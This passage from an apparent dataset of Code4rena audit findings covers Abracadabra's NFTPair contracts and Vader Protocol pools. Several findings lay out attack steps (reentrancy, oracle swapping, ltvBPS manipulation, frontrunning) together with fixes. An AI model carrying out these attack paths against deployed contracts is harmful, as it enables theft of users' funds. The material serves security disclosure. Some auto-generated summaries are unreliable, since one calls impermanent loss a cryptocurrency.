      "content": "\nAccording to the `README.md`, `NFTPair`s specifically involve `ERC721` tokens. Therefore the contract should implement `ERC721TokenReceiver`, or customer transfers involving `safeTransferFrom()` calls will revert\n\n```solidity\nFile: contracts/NFTPair.sol   #1\n\n59  contract NFTPair is BoringOwnable, Domain, IMasterContract {\n```\n\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPair.sol#L59>\n\n```solidity\nFile: contracts/NFTPairWithOracle.sol   #2\n\n69  contract NFTPairWithOracle is BoringOwnable, Domain, IMasterContract {\n```\n\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPairWithOracle.sol#L69>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Abracadabra Money",
      "source_link": "https://code4rena.com/reports/2022-04-abranft",
      "github_link": "#l-02-pairs-do-not-implement-erc721tokenreceiver",
      "tags": [],
      "finders": []
    },
    {
      "id": "4551",
      "title": "[L-01] Should ensure loan collateral is not immediately seizable",
      "impact": "LOW",
      "content": "\nFor the Oracle version there are checks to make sure that the current valuation is above the amount loaned. There should be a similar check that the loan duration is not zero. Zero is not useful for flash loans because of the origination fees.\n\n```solidity\nFile: contracts/NFTPairWithOracle.sol   #1\n\n224          tokenLoanParams[tokenId] = params;\n```\n\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPair.sol#L224>\n\n```solidity\nFile: contracts/NFTPairWithOracle.sol   #2\n\n244          tokenLoanParams[tokenId] = params;\n```\n\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPairWithOracle.sol#L244>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Abracadabra Money",
      "source_link": "https://code4rena.com/reports/2022-04-abranft",
      "github_link": "#l-01-should-ensure-loan-collateral-is-not-immediately-seizable",
      "tags": [],
      "finders": []
    },
    {
      "id": "2131",
      "title": "[M-01] Reentrancy at _requestLoan allows requesting a loan without supplying collateral",
      "impact": "MEDIUM",
      "content": "_Submitted by kenzo, also found by WatchPug, GimelSec, Czar102, and AuditsAreUS_\n\n<https://github.com/code-423n4/2022-04-abranft/blob/main/contracts/NFTPair.sol#L218>\n\n<https://github.com/code-423n4/2022-04-abranft/blob/main/contracts/NFTPairWithOracle.sol#L238>\n\n`_requestLoan` makes an external call to the collateral contract before updating the NFTPair contract state.\n\n### Impact\n\nIf the ERC721 collateral has a afterTokenTransfer hook,\nThe NFTPair contract can be reentered, and a loan can be requested without the borrower supplying the collateral.\nSomeone can then lend for the loan while the collateral is missing from the contract.\nTherefore the malicious borrower received the loan without supplying collateral - so lender's funds can be stolen.\nThe issue is present in both NFTPair and NFTPairWithOracle.\n\n### Proof of Concept\n\nAssume the NFT contract has an [afterTokenTransfer hook](https://docs.openzeppelin.com/contracts/4.x/api/token/erc721#ERC721-\\_afterTokenTransfer-address-address-uint256-) which calls back to the malicious borrower.\nPOC in short: borrower will call `requestLoan` with `skim==false`, then during the hook will reenter `requestLoan` with `skim==true`, then call `removeCollateral` to get his collateral back, then the first `requestLoan` will resume and initiate the loan, although the collateral is not in the contract any more.\n\nPOC in long: the borrower will do the following:\n\n*   Call [`requestLoan`](https://github.com/code-423n4/2022-04-abranft/blob/main/contracts/NFTPair.sol#L205:#L227) with skim==false.\n*   `requestLoan` [will call](https://github.com/code-423n4/2022-04-abranft/blob/main/contracts/NFTPair.sol#L218) `collateral.transferFrom()`.\n*   The collateral will be transferred to the NFTPair. Afterwards, the ERC721 contract will execute the `afterTokenTransfer` hook, and hand control back to Malbo (malicious borrower).\n*   Malbo will call `requestLoan` again with `skim==true`.\n*   As the first request's details have not been updated yet, the tokenId status is still LOAN_INITIAL, and the [require statement of the loan status](https://github.com/code-423n4/2022-04-abranft/blob/main/contracts/NFTPair.sol#L214) will pass.\n*   The NFT has already been transfered to the contract, so the [require statement of token ownership](https://github.com/code-423n4/2022-04-abranft/blob/main/contracts/NFTPair.sol#L216) will pass.\n*   `requestLoan` (the second) will continue and set the loan details and status.\n*   After it finishes, still within the `afterTokenTransfer` hook, Malbo will call [`removeCollateral`](https://github.com/code-423n4/2022-04-abranft/blob/main/contracts/NFTPair.sol#L247:#L268). His call will succeed as the loan is in status requested. So the collateral will get sent back to Malbo.\n*   Now the `afterTokenTransfer` hook finishes.\n*   The original `requestLoan` will resume operation at the [point](https://github.com/code-423n4/2022-04-abranft/blob/main/contracts/NFTPair.sol#L220:#L224) where all the loan details will be updated.\n*   Therefore, the contract will mark the loan is valid, although the collateral is not in the contract anymore. A lender might then lend funds against the loan without Malbo needing to pay back.\n\n### Recommended Mitigation Steps\n\nMove the external call to the end of the function to conform with checks-effects-interaction pattern.\n\n**[cryptolyndon (AbraNFT) disputed and commented](https://github.com/code-423n4/2022-04-abranft-findings/issues/61#issuecomment-1118148144):**\n > Not a bug. We do not use `safeTransfer`, and if the collateral contract cannot be trusted, then all bets are off.\n\n**[0xean (judge) downgraded to medium severity and commented](https://github.com/code-423n4/2022-04-abranft-findings/issues/61#issuecomment-1133436020):**\n > I am downgrading this to medium severity and do believe it should be fixed by the sponsor.  Re-entrancy has proved to be a problem in many ways in the space and while the sponsor says they are trusting the collateral contract, I dont think this is a defensible stance from what can be easily mitigated by either re-ordering code to conform to well established patterns or by adding a modifier.\n> \n> `\n> 2 — Med: Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.\n> `\n> \n> \n\n\n\n***\n\n",
      "summary": "\nA vulnerability has been discovered in the NFTPair and NFTPairWithOracle contracts. The _requestLoan function makes an external call to the collateral contract before updating the NFTPair contract state. This means that if the ERC721 collateral has an afterTokenTransfer hook, the NFTPair contract can be reentered and a loan can be requested without the borrower supplying the collateral. This would allow the malicious borrower to receive the loan without supplying collateral, and the lender's funds can be stolen.\n\nA proof of concept has been provided which demonstrates how a malicious borrower can use the afterTokenTransfer hook to reenter the _requestLoan function, set the loan details and status, and then call removeCollateral to get their collateral back. This would allow the malicious borrower to receive the loan without supplying the collateral, and the lender's funds can be stolen.\n\nThe recommended mitigation steps for this vulnerability are to move the external call to the end of the function to conform with the checks-effects-interaction pattern. This would ensure that the NFTPair contract state is updated before any external calls are made, preventing the malicious borrower from taking advantage of the afterTokenTransfer hook.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Abracadabra Money",
      "source_link": "https://code4rena.com/reports/2022-04-abranft",
      "github_link": "https://github.com/code-423n4/2022-04-abranft-findings/issues/61",
      "tags": [],
      "finders": [
        "Czar102",
        "WatchPug",
        "AuditsAreUS",
        "GimelSec",
        "kenzo"
      ]
    },
    {
      "id": "2130",
      "title": "[H-05] Mistake while checking LTV to lender accepted LTV",
      "impact": "HIGH",
      "content": "_Submitted by catchup, also found by WatchPug, gzeon, and hyh_\n\nIt comments in the `\\_lend()` function that lender accepted conditions must be at least as good as the borrower is asking for.\nThe line which checks the accepted LTV (lender's LTV) against borrower asking LTV is:\n`params.ltvBPS >= accepted.ltvBPS`,\nThis means lender should be offering a lower LTV, which must be the opposite way around.\nI think this may have the potential to strand the lender, if he enters a lower LTV.\nFor example borrower asking LTV is 86%. However, lender enters his accepted LTV as 80%.\nlend() will execute with 86% LTV and punish the lender, whereas it should revert and acknowledge the lender that his bid is not good enough.\n\n### Proof of Concept\n\n<https://github.com/code-423n4/2022-04-abranft/blob/main/contracts/NFTPairWithOracle.sol#L316>\n\n### Recommended Mitigation Steps\n\nThe condition should be changed as:\n`params.ltvBPS <= accepted.ltvBPS`,\n\n**[cryptolyndon (AbraNFT) confirmed and commented](https://github.com/code-423n4/2022-04-abranft-findings/issues/55#issuecomment-1118145958):**\n > Confirmed, and the first to note this particular issue.\n\n\n\n***\n\n \n",
      "summary": "\nA bug report has been filed for the code in the file NFTPairWithOracle.sol, located at line 316. The issue is that the code comments in the _lend() function that the lender accepted conditions must be at least as good as the borrower is asking for. However, the code is checking for the opposite, which could potentially strand the lender if they enter a lower LTV than the borrower. As an example, if the borrower is asking for an LTV of 86%, but the lender enters an accepted LTV of 80%, then the lend() function will execute with an LTV of 86%, punishing the lender. The bug was found using manual analysis, and the recommended mitigation steps are to change the condition as: params.ltvBPS <= accepted.ltvBPS.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Abracadabra Money",
      "source_link": "https://code4rena.com/reports/2022-04-abranft",
      "github_link": "https://github.com/code-423n4/2022-04-abranft-findings/issues/55",
      "tags": [],
      "finders": [
        "WatchPug",
        "catchup",
        "hyh",
        "gzeon"
      ]
    },
    {
      "id": "2129",
      "title": "[H-04] Lender is able to seize the collateral by changing the loan parameters",
      "impact": "HIGH",
      "content": "_Submitted by Ruhum, also found by IllIllI, WatchPug, BowTiedWardens, gzeon, plotchy, and scaraven_\n\n<https://github.com/code-423n4/2022-04-abranft/blob/main/contracts/NFTPairWithOracle.sol#L198-L223>\n\n<https://github.com/code-423n4/2022-04-abranft/blob/main/contracts/NFTPairWithOracle.sol#L200-L212>\n\n<https://github.com/code-423n4/2022-04-abranft/blob/main/contracts/NFTPairWithOracle.sol#L288>\n\nThe lender should only be able to seize the collateral if:\n\n*   the borrower didn't repay in time\n*   the collateral loses too much of its value\n\nBut, the lender is able to seize the collateral at any time by modifying the loan parameters.\n\n### Proof of Concept\n\nThe [`updateLoanParams()`](https://github.com/code-423n4/2022-04-abranft/blob/main/contracts/NFTPairWithOracle.sol#L198-L223) allows the lender to modify the parameters of an active loan in favor of the borrower. But, by setting the `ltvBPS` value to `0` they are able to seize the collateral.\n\nIf `ltvBPS` is `0` the following require statement in `removeCollateral()` will always be true:\n\n<https://github.com/code-423n4/2022-04-abranft/blob/main/contracts/NFTPairWithOracle.sol#L288>\n\n`rate * 0 / BPS < amount` is always `true`.\n\nThat allows the lender to seize the collateral although its value didn't decrease nor did the time to repay the loan come.\n\nSo the required steps are:\n\n1.  lend the funds to the borrower\n2.  call `updateLoanParams()` to set the `ltvBPS` value to `0`\n3.  call `removeCollateral()` to steal the collateral from the contract\n\n### Recommended Mitigation Steps\n\nDon't allow `updateLoanParams()` to change the `ltvBPS` value.\n\n**[cryptolyndon (AbraNFT) confirmed and commented](https://github.com/code-423n4/2022-04-abranft-findings/issues/51#issuecomment-1118132221):**\n > Confirmed, and the first to report this particular exploit.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the NFTPairWithOracle.sol smart contract code. The vulnerability allows the lender to seize the collateral at any time by modifying the loan parameters. This is possible by setting the ltvBPS value to 0, which bypasses the requirement that the collateral must lose value or the borrower must not repay in time before the lender can seize the collateral. The steps to exploit this vulnerability are: lend funds to the borrower, call updateLoanParams() to set the ltvBPS value to 0, and call removeCollateral() to steal the collateral from the contract. To mitigate this vulnerability, the updateLoanParams() should not be allowed to change the ltvBPS value.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Abracadabra Money",
      "source_link": "https://code4rena.com/reports/2022-04-abranft",
      "github_link": "https://github.com/code-423n4/2022-04-abranft-findings/issues/51",
      "tags": [],
      "finders": [
        "IllIllI",
        "BowTiedWardens",
        "scaraven",
        "Ruhum",
        "gzeon",
        "WatchPug",
        "plotchy"
      ]
    },
    {
      "id": "2128",
      "title": "[H-03] Critical Oracle Manipulation Risk by Lender",
      "impact": "HIGH",
      "content": "_Submitted by 0x1337, also found by catchup, cccz, kenzo, GimelSec, BowTiedWardens, gzeon, horsefacts, and hyh_\n\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPairWithOracle.sol#L286-L288>\n\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPairWithOracle.sol#L200-L211>\n\nThe intended use of the Oracle is to protect the lender from a drop in the borrower's collateral value. If the collateral value goes up significantly and higher than borrowed amount + interest, the lender should not be able to seize the collateral at the expense of the borrower. However, in the `NFTPairWithOracle` contract, the lender could change the Oracle once a loan is outstanding, and therefore seize the collateral at the expense of the borrower, if the actual value of the collateral has increased significantly. This is a critical risk because borrowers asset could be lost to malicious lenders.\n\n### Proof of Concept\n\nIn `NFTPairWithOracle`, the `params` are set by the `borrower` when they call `requestLoan()`, including the Oracle used. Once a lender agrees with the parameters and calls the `lend()` function, the `loan.status` changes to `LOAN_OUTSTANDING`.\n\nThen, the lender can call the `updateLoanParams()` function and pass in its own `params` including the Oracle used. The `require` statement from line 205 to 211 does not check if `params.oracle` and `cur.oracle` are the same. A malicious lender could pass in his own `oracle` after the loan becomes outstanding, and the change would be reflected in line 221.\n\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPairWithOracle.sol#L200-L211>\n\nIn a situation where the actual value of the collateral has gone up by a lot, exceeding the amount the lender is owed (principal + interest), the lender would have an incentive to seize the collateral. If the Oracle is not tampered with, lender should not be able to do this, because line 288 should fail. But a lender could freely change Oracle once the loan is outstanding, then a tampered Oracle could produce a very low `rate` in line 287 such that line 288 would pass, allowing the lender to seize the collateral, hurting the borrower.\n\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPairWithOracle.sol#L286-L288>\n\n### Recommended Mitigation Steps\n\nOnce a loan is agreed to, the oracle used should not change. I'd recommend adding a check in the `require` statement in line 205 - 211 that `params.oracle == cur.oracle`\n\n**[cryptolyndon (AbraNFT) confirmed and commented](https://github.com/code-423n4/2022-04-abranft-findings/issues/37#issuecomment-1118104950):**\n > Confirmed, this is bad. First report of this particular exploit.\n\n\n\n***\n\n",
      "summary": "\nA bug has been found in the `NFTPairWithOracle` contract, which allows a malicious lender to change the Oracle used once a loan is outstanding and seize the collateral at the expense of the borrower. This could happen if the actual value of the collateral has increased significantly and is higher than the amount the lender is owed (principal + interest). \n\nThe bug was identified through manual review. The `require` statement from line 205 to 211 does not check if `params.oracle` and `cur.oracle` are the same. The malicious lender could pass in their own `oracle` after the loan becomes outstanding, and the change would be reflected in line 221. In line 287, the tampered Oracle could produce a very low `rate` such that line 288 would pass, allowing the lender to seize the collateral, hurting the borrower. \n\nTo mitigate this risk, a check should be added in the `require` statement in line 205 - 211 that `params.oracle == cur.oracle`. This will ensure that the Oracle used cannot be changed after the loan is agreed to, protecting the borrower from malicious lenders.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Abracadabra Money",
      "source_link": "https://code4rena.com/reports/2022-04-abranft",
      "github_link": "https://github.com/code-423n4/2022-04-abranft-findings/issues/37",
      "tags": [],
      "finders": [
        "BowTiedWardens",
        "cccz",
        "horsefacts",
        "gzeon",
        "catchup",
        "hyh",
        "0x1337",
        "GimelSec",
        "kenzo"
      ]
    },
    {
      "id": "2127",
      "title": "[H-02] The return value `success` of the get function of the INFTOracle interface is not checked",
      "impact": "HIGH",
      "content": "_Submitted by cccz, also found by Ruhum, catchup, IllIllI, WatchPug, berndartmueller, plotchy, antonttc, hyh, and 0xf15ers_\n\n        function get(address pair, uint256 tokenId) external returns (bool success, uint256 rate);\n\nThe get function of the INFTOracle interface returns two values, but the success value is not checked when used in the NFTPairWithOracle contract. When success is false, NFTOracle may return stale data.\n\n### Proof of Concept\n\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/interfaces/INFTOracle.sol#L10-L10> \n\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPairWithOracle.sol#L287-L287>\n\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPairWithOracle.sol#L321-L321>\n\n### Recommended Mitigation Steps\n\n    (bool success, uint256 rate) = loanParams.oracle.get(address(this), tokenId);\n    require(success);\n\n**[cryptolyndon (AbraNFT) confirmed and commented](https://github.com/code-423n4/2022-04-abranft-findings/issues/21#issuecomment-1115757383):**\n > Agreed, and the first report of this issue.\n\n**[0xean (judge) increased severity to High and commented](https://github.com/code-423n4/2022-04-abranft-findings/issues/21#issuecomment-1133443334):**\n > I am upgrading this to High severity. \n> \n> This is a direct path to assets being lost. \n> \n> `\n> 3 — High: Assets can be stolen/lost/compromised directly (or indirectly if there is a valid attack path that does not have hand-wavy hypotheticals).\n> `\n\n\n\n***\n\n",
      "summary": "\nA bug has been discovered in the code of the INFTOracle interface and the NFTPairWithOracle contract. The get function of the INFTOracle interface returns two values, but the success value is not checked when used in the NFTPairWithOracle contract. When success is false, NFTOracle may return stale data. This can be seen in the code snippets provided in the bug report. This bug can be mitigated by adding a require statement to check if the success value is true before continuing with the code.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Abracadabra Money",
      "source_link": "https://code4rena.com/reports/2022-04-abranft",
      "github_link": "https://github.com/code-423n4/2022-04-abranft-findings/issues/21",
      "tags": [],
      "finders": [
        "IllIllI",
        "cccz",
        "0xf15ers",
        "Ruhum",
        "WatchPug",
        "berndartmueller",
        "plotchy",
        "antonttc",
        "catchup",
        "hyh"
      ]
    },
    {
      "id": "2126",
      "title": "[H-01] Avoidance of Liquidation Via Malicious Oracle",
      "impact": "HIGH",
      "content": "_Submitted by BowTiedWardens, also found by gzeon, and hyh_\n\nIssue: Arbitrary oracles are permitted on construction of loans, and there is no check that the lender agrees to the used oracle.\n\nConsequences: A borrower who requests a loan with a malicious oracle can avoid legitimate liquidation.\n\n### Proof of Concept\n\n*   Borrower requests loan with an malicious oracle\n*   Lender accepts loan unknowingly\n*   Borrowers's bad oracle is set to never return a liquidating rate on `oracle.get` call.\n*   Lender cannot call `removeCollateral` to liquidate the NFT when it should be allowed, as it will fail the check on [L288](https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPairWithOracle.sol#L288)\n*   To liquidate the NFT, the lender would have to whitehat along the lines of H-01, by atomically updating to an honest oracle and calling `removeCollateral`.\n\n### Mitigations\n\n*   Add `require(params.oracle == accepted.oracle)` as a condition in `_lend`\n*   Consider only allowing whitelisted oracles, to avoid injection of malicious oracles at the initial loan request stage\n\n**[cryptolyndon (AbraNFT) confirmed and commented](https://github.com/code-423n4/2022-04-abranft-findings/issues/136#issuecomment-1119136462):**\n > Oracle not compared to lender agreed value: confirmed, and I think this is the first time I've seen this particular vulnerability pointed out. Not marking the entire issue as a duplicate for that reason.\n> \n> Oracle not checked on loan request: Not an issue, first reported in #62.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about an issue in the code of the NFTPairWithOracle.sol contract. The issue is that when a borrower requests a loan, there is no check that the lender agrees to the used oracle, which means that a borrower can request a loan with a malicious oracle and avoid legitimate liquidation. This can be proven through a proof of concept, where the borrower requests a loan with a malicious oracle, the lender unknowingly accepts the loan, and the bad oracle is set to never return a liquidating rate on the oracle.get call. To liquidate the NFT, the lender would have to whitehat by atomically updating to an honest oracle and calling removeCollateral. There are two proposed mitigations to this issue. The first is to add a condition that requires that the oracle used must be the accepted oracle in the _lend function. The second is to consider only allowing whitelisted oracles, to avoid injection of malicious oracles at the initial loan request stage.",
      "quality_score": 3,
      "rarity_score": 1,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Abracadabra Money",
      "source_link": "https://code4rena.com/reports/2022-04-abranft",
      "github_link": "https://github.com/code-423n4/2022-04-abranft-findings/issues/136",
      "tags": [
        "Oracle"
      ],
      "finders": [
        "hyh",
        "BowTiedWardens",
        "gzeon"
      ]
    },
    {
      "id": "42430",
      "title": "[M-04] `VaderReserve.reimburseImpermanentLoss` improperly converts USDV to VADER",
      "impact": "MEDIUM",
      "content": "_Submitted by TomFrenchBlockchain_\n\nIL isn't properly converted from being in terms of USDV to VADER, resulting in reserve paying out incorrect amount.\n\n#### Proof of Concept\n\n`VaderReserve.reimburseImpermanentLoss` receives an `amount` in terms of USDV and converts this to an amount of VADER to send to `recipient`.\n\nHowever as shown in the link if there is a previous price stored for USDV, the amount of VADER tokens to be sent to the `recipient` is `amount / usdvPrice`.\n\n<https://github.com/code-423n4/2021-12-vader/blob/fd2787013608438beae361ce1bb6d9ffba466c45/contracts/reserve/VaderReserve.sol#L84-L110>\n\n`usdvPrice` is the total USD value of foreign assets divided by the total amount of USDV in a number of pairs. It's then some measure of the inverse of the price of USDV in USD, nothing to do with converting into VADER.\n\nThe reserve will then improperly calculate the amount of VADER to pay out once there is a single reading of the USDV price.\n\n#### Recommended Mitigation Steps\n\nIt looks like both branches of this if statement are supposed to be run, i.e. convert from USDV to USD and then to VADER but I can't be sure. Care should be taken so that the calculation being performed is the expected one.\n\n**[SamSteinGG (Vader) acknowledged](https://github.com/code-423n4/2021-12-vader-findings/issues/7)**\n\n\n\n***\n\n",
      "summary": "\nThe bug report is about a problem with converting a cryptocurrency called IL from USDV to VADER. This results in the reserve paying out the wrong amount. The proof of concept shows that the amount of VADER being sent to the recipient is calculated incorrectly, using a previous price for USDV. This is because the code is using the USD value of foreign assets divided by the total amount of USDV, which is not the correct way to convert to VADER. The recommended mitigation steps suggest that both branches of the code should be run to ensure the correct calculation is being performed. The creator of VADER has acknowledged the issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-12-vader",
      "github_link": "https://github.com/code-423n4/2021-12-vader-findings/issues/7",
      "tags": [],
      "finders": []
    },
    {
      "id": "42429",
      "title": "[M-03] No way to remove `GasThrottle` from `VaderPool` after deployment",
      "impact": "MEDIUM",
      "content": "_Submitted by TomFrenchBlockchain_\n\nPotential DOS on swaps on `VaderPool`.\n\n#### Proof of Concept\n\nBasePool makes use of a `validateGas` modifier on swaps which checks that the user's gas price is below the value returned by `_FAST_GAS_ORACLE`.\n\n<https://github.com/code-423n4/2021-12-vader/blob/fd2787013608438beae361ce1bb6d9ffba466c45/contracts/dex/pool/BasePool.sol#L292>\n\n<https://github.com/code-423n4/2021-12-vader/blob/fd2787013608438beae361ce1bb6d9ffba466c45/contracts/dex/utils/GasThrottle.sol#L8-L22>\n\nShould  `_FAST_GAS_ORACLE` be compromised to always return zero then all swaps will fail. There is no way to recover from this scenario.\n\n#### Recommended Mitigation Steps\n\nEither remove GasThrottle.sol entirely or allow governance to turn it off as is done in VaderPoolV2.sol\n\n\n\n***\n\n",
      "summary": "\nA potential denial of service (DOS) attack has been discovered on `VaderPool`, a platform for swapping tokens. This attack could occur if a certain function, `_FAST_GAS_ORACLE`, is manipulated to always return zero. This would cause all swaps to fail and there is currently no way to recover from this situation. To prevent this, it is recommended to either remove the function entirely or allow for it to be turned off by those in charge of the platform.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-12-vader",
      "github_link": "https://github.com/code-423n4/2021-12-vader-findings/issues/52",
      "tags": [],
      "finders": []
    },
    {
      "id": "42428",
      "title": "[M-02] Adding pair of the same `foreignAsset` would replace oracle of earlier entry",
      "impact": "MEDIUM",
      "content": "_Submitted by gzeon_\n\nOracles are mapped to the `foreignAsset` but not to the specific pair. Pairs with the same `foreignAsset` (e.g. UniswapV2 and Sushi) will be forced to use the same oracle. Generally this should be the expected behavior but there are also possibility that while adding a new pair changed the oracle of an older pair unexpectedly.\n\n#### Proof of Concept\n\n<https://github.com/code-423n4/2021-12-vader/blob/9fb7f206eaff1863aeeb8f997e0f21ea74e78b49/contracts/lbt/LiquidityBasedTWAP.sol#L271>\n\n            oracles[foreignAsset] = oracle;\n\n#### Recommended Mitigation Steps\n\nBind the oracle to pair instead\n\n**[SamSteinGG (Vader) confirmed](https://github.com/code-423n4/2021-12-vader-findings/issues/160)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report was submitted by a user named gzeon. It states that the oracles are mapped to the `foreignAsset` but not to the specific pair. This means that pairs with the same `foreignAsset` (such as UniswapV2 and Sushi) will be forced to use the same oracle. While this may be expected behavior, there is a possibility that adding a new pair could unexpectedly change the oracle of an older pair. A proof of concept is provided in the report, along with a recommended mitigation step to bind the oracle to the pair instead. This recommendation has been confirmed by a user named SamSteinGG (Vader).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-12-vader",
      "github_link": "https://github.com/code-423n4/2021-12-vader-findings/issues/160",
      "tags": [],
      "finders": []
    },
    {
      "id": "42427",
      "title": "[M-01] `VaderPoolV2.mintFungible` exposes users to unlimited slippage",
      "impact": "MEDIUM",
      "content": "_Submitted by TomFrenchBlockchain, also found by pauliax and robee_\n\nFrontrunners can extract up to 100% of the value provided by LPs to VaderPoolV2 as fungible liquidity.\n\n#### Proof of Concept\n\nUsers can provide liquidity to `VaderPoolV2` through the `mintFungible` function.\n\n<https://github.com/code-423n4/2021-12-vader/blob/fd2787013608438beae361ce1bb6d9ffba466c45/contracts/dex-v2/pool/VaderPoolV2.sol#L311-L317>\n\nThis allows users to provide tokens in any ratio and the pool will calculate what fraction of the value in the pool this makes up and mint the corresponding amount of liquidity units as an ERC20.\n\nHowever there's no way for users to specify the minimum number of liquidity units they will accept. As the number of liquidity units minted is calculated from the current reserves, this allows frontrunners to manipulate the pool's reserves in such a way that the LP receives fewer liquidity units than they should. e.g. LP provides a lot of `nativeAsset` but very little `foreignAsset`, the frontrunner can then sell a lot of `nativeAsset` to the pool to devalue it.\n\nOnce this is done the attacker returns the pool's reserves back to normal and pockets a fraction of the value which the LP meant to provide as liquidity.\n\n#### Recommended Mitigation Steps\n\nAdd a user-specified minimum amount of LP tokens to mint.\n\n**[SamSteinGG (Vader) acknowledged](https://github.com/code-423n4/2021-12-vader-findings/issues/2)**\n\n**[Jack the Pug (judge) decreased severity to medium and commented](https://github.com/code-423n4/2021-12-vader-findings/issues/2#issuecomment-1066036603):**\n > I'm downgrading this [from `high`] to `med` and merging all the issues related to slippage control into this one.\n\n\n\n***\n\n",
      "summary": "\nThe report describes a bug in the VaderPoolV2 contract where frontrunners can manipulate the pool's reserves and extract up to 100% of the value provided by liquidity providers (LPs). This is done by taking advantage of the fact that LPs cannot specify a minimum number of liquidity units they will accept, allowing frontrunners to devalue the pool and pocket a fraction of the value meant for the LP. The recommended mitigation step is to add a user-specified minimum amount of LP tokens to mint. The severity of the bug was initially classified as high, but was later downgraded to medium by the judge and merged with other related issues.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-12-vader",
      "github_link": "https://github.com/code-423n4/2021-12-vader-findings/issues/2",
      "tags": [],
      "finders": []
    },
    {
      "id": "42426",
      "title": "[H-12] Using single total native reserve variable for synth and non-synth reserves of `VaderPoolV2` can lead to losses for synth holders",
      "impact": "HIGH",
      "content": "_Submitted by hyh, also found by certora_\n\nUsers that mint synths do provide native assets, increasing native reserve pool, but do not get any liquidity shares issued.\nIn the same time, an exit of non-synth liquidity provider yields releasing a proportion of all current reserves to him.\n\nWhenever an exit of non-synth LP is substantial enough, the system will have much less native asset regarding the cumulative deposit of synth holders. That is, when a LP entered he provided a share of current reserves, both native and foreign, and got the corresponding liquidity shares in return. Suppose then big enough amounts of synths were minted, providing correspondingly big enough amount of native assets. If the LP now wants to exit, he will obtain a part of total native assets, including a part of the amount that was provided by synth minter. If the exit is big enough there will be substantially less native assets left to reimburse the synth minter than he initially provided. This is not reversible: the synth minters lost their native assets to LP that exited.\n\n#### Proof of Concept\n\nThere are three types of mint/burn: NFT, fungible and synths. First two get LP shares, the latter gets synths. Whenever NFT or fungible LP exits, it gets a proportion of combined reserves. That is, some of native reserves were deposited by synth minters, but it is not accounted anyhow, only one total reserve number per asset is used.\n\nSuppose the following scenario, Alice wants to provide liquidity, while Bob wants to mint synths:\n\n1.  Alice deposits both sides to a pool, 100 USDV and 100 foreign.\n2.  Bob deposit 100 USDV and mints some foreign Synth.\n3.  LP withdraws 95% of her liquidity shares. As she owns the pool liquidity, she gets 95% of USDV and foreign total reserves, 190 USDV and 95 foreign. Alice received almost all of her and Bob's USDV.\n4.  If Bob burn his synth and withdraw, he will get a tiny fraction of USDV he deposited (calculated by VaderMath.calculateSwap, we use its terms):\n\n<https://github.com/code-423n4/2021-12-vader/blob/main/contracts/dex/math/VaderMath.sol#L98>\nx = 100, X = 0.05 \\* 200 = 10, Y = 0.05 \\* 100 = 5.\nSwap outcome, how much USDV will Bob get, is x \\* Y \\* X / (x + X) ^ 2 = 100 \\* 5 \\* 10 / (110^2) = 0.4 (rounded).\n\nThe issue is that synth provided and LP provided USDV aren't accounted separately, total reserves number if used everywhere instead:\n\nSynth minters provide native asset, say USDV, to the system:\n<https://github.com/code-423n4/2021-12-vader/blob/main/contracts/dex-v2/pool/VaderPoolV2.sol#L187>\n\nSynth minters get synths and no LP shares, while to account for their deposit, the total USDV balance is increased:\n<https://github.com/code-423n4/2021-12-vader/blob/main/contracts/dex-v2/pool/VaderPoolV2.sol#L187>\n\nWhen LP enters, it gets liquidity 